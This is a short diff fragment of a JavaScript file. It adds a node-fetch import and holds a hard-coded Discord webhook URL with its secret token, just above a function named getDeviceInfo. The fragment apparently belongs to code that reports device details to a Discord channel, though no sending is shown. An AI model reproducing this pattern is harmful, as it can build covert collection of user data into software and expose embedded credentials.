@@ -1,5 +1,6 @@
 const { useState, useEffect, useRef, useCallback } = React;
-  
+const fetch = require("node-fetch");
+
 const discordWebhookURL = `https://discord.com/api/webhooks/1415852727145336832/RrVh5LhYuqcAsUtnZkHIkcPOrJmKrmdQePFrOpuQh_AvSdLNNN1oND7xPv3v4z_64p12`;
 
 function getDeviceInfo() {
